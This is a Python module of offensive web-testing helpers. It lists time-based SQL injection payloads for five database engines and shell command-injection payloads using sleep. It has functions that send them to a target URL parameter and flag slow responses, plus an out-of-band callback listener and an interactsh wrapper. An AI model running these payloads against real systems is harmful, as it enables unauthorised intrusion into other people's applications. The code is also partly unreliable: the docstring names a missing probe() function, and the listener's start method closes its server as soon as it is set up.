"""
attack.blind — blind vuln detection helpers.
- time-based: measure response delta to detect SQLi/CMDi
- OOB: interactsh wrapper if installed, else local HTTP listener
- no network calls until you invoke probe()
"""
import os
import re
import time
import uuid
import json
import socket
import threading
import subprocess
import http.server
import socketserver
import pathlib

try:
    import httpx
    _HAVE_HTTPX = True
except Exception:
    _HAVE_HTTPX = False


# ---------- time-based ----------

TIME_SQLI = [
    ("mysql",     "' AND SLEEP({n})-- -"),
    ("mysql",     "' AND (SELECT SLEEP({n}))-- -"),
    ("mysql",     "1' AND SLEEP({n})#"),
    ("postgres",  "'; SELECT pg_sleep({n})-- -"),
    ("mssql",     "'; WAITFOR DELAY '00:00:0{n}'-- -"),
    ("oracle",    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{n})-- -"),
    ("sqlite",    "' AND 1=randomblob(100000000)-- -"),
]

TIME_CMDI = [
    ("sh",       "; sleep {n}"),
    ("sh",       "|sleep {n}"),
    ("sh",       "`sleep {n}`"),
    ("sh",       "$(sleep {n})"),
    ("sh",       "& sleep {n} &"),
    ("sh",       "%0asleep {n}"),
    ("sh",       "\n sleep {n}"),
]


def measure(client, method, url, param, payload, in_body=False, baseline_reps=3):
    """
    Send baseline N times, then payload once. Return dict with deltas.
    client = httpx.Client
    """
    if not _HAVE_HTTPX:
        return {"error": "httpx not installed"}
    t0 = time.time()
    for _ in range(baseline_reps):
        try:
            if in_body:
                client.request(method, url, data={param: "test"})
            else:
                client.request(method, url, params={param: "test"})
        except Exception:
            pass
    baseline = (time.time() - t0) / baseline_reps

    t0 = time.time()
    try:
        if in_body:
            client.request(method, url, data={param: payload})
        else:
            client.request(method, url, params={param: payload})
    except Exception as e:
        return {"error": str(e)}
    elapsed = time.time() - t0

    return {
        "baseline": round(baseline, 3),
        "elapsed": round(elapsed, 3),
        "delta": round(elapsed - baseline, 3),
    }


def time_based_sqli(client, method, url, param, in_body=False, threshold=3.0,
                    kind="mysql"):
    """Fire SQLi sleep payloads; report which ones pushed delta past threshold."""
    hits = []
    for name, tmpl in TIME_SQLI:
        if name != kind:
            continue
        payload = tmpl.format(n=5)
        r = measure(client, method, url, param, payload, in_body)
        if r.get("delta", 0) >= threshold:
            hits.append({"kind": "sqli_time", "db": name, "param": param,
                         "payload": payload, **r})
    return hits


def time_based_cmdi(client, method, url, param, in_body=False, threshold=3.0):
    hits = []
    for name, tmpl in TIME_CMDI:
        payload = tmpl.format(n=5)
        r = measure(client, method, url, param, payload, in_body)
        if r.get("delta", 0) >= threshold:
            hits.append({"kind": "cmdi_time", "shell": name, "param": param,
                         "payload": payload, **r})
    return hits


# ---------- OOB ----------

class _CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.server.callbacks.append({
            "ts": time.time(),
            "method": "GET",
            "path": self.path,
            "headers": dict(self.headers),
            "from": self.client_address[0],
        })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
        self.server.callbacks.append({
            "ts": time.time(),
            "method": "POST",
            "path": self.path,
            "headers": dict(self.headers),
            "body": body[:2000],
            "from": self.client_address[0],
        })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


class LocalCallback:
    """Local HTTP listener for OOB payloads."""
    def __init__(self, port=0, host="0.0.0.0"):
        self.host = host
        self.port = port
        self.httpd = None
        self.thread = None
        self.callbacks = []

    def start(self):
        with socketserver.TCPServer((self.host, self.port), _CallbackHandler) as httpd:
            httpd.callbacks = self.callbacks
            self.httpd = httpd
            self.port = httpd.server_address[1]
            self.thread = threading.Thread(target=httpd.serve_forever, daemon=True)
            self.thread.start()
        return self.port

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()

    def url_for(self, host="localhost"):
        return f"http://{host}:{self.port}"

    def wait(self, seconds=10):
        time.sleep(seconds)
        return list(self.callbacks)

    def clear(self):
        self.callbacks.clear()


def have_interactsh():
    for path in os.environ.get("PATH", "").split(os.pathsep):
        for name in ("interactsh-client", "interactsh"):
            if pathlib.Path(path, name).exists():
                return pathlib.Path(path, name)
    return None


def interactsh_generate(timeout=15):
    """Run interactsh-client briefly to grab a URL. Returns (url, proc) or (None, None)."""
    ic = have_interactsh()
    if not ic:
        return None, None
    try:
        proc = subprocess.Popen([str(ic), "-n", "1", "-json"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        deadline = time.time() + timeout
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
            try:
                j = json.loads(line.strip())
                if "host" in j:
                    return j["host"], proc
                if "url" in j:
                    return j["url"], proc
            except Exception:
                if re.search(r"[a-z0-9]+\.[a-z0-9]+", line):
                    m = re.search(r"([a-z0-9]+\.interactsh\.[a-z]+)", line)
                    if m:
                        return m.group(1), proc
        return None, proc
    except Exception:
        return None, None


if __name__ == "__main__":
    # demo: start local listener, curl it, read callback
    cb = LocalCallback(port=0)
    port = cb.start()
    print(f"listening on 127.0.0.1:{port}")
    if _HAVE_HTTPX:
        try:
            httpx.get(f"http://127.0.0.1:{port}/test?x=1", timeout=5)
        except Exception as e:
            print("curl err:", e)
    time.sleep(0.5)
    hits = cb.wait(1)
    print(f"callbacks: {len(hits)}")
    for h in hits:
        print(f"  {h['method']} {h['path']} from {h['from']}")
    cb.stop()
    print("interactsh available:", bool(have_interactsh()))
